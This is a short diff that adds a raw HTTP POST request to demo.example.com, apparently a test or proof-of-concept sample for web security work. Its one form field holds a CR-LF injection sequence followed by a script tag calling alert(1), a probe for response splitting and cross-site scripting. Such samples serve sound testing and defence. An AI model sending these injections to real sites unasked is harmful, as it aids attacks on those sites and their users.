@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Connection: close
+
+search="red=%0d%0a%0d%0a<script>alert(1)</script>"
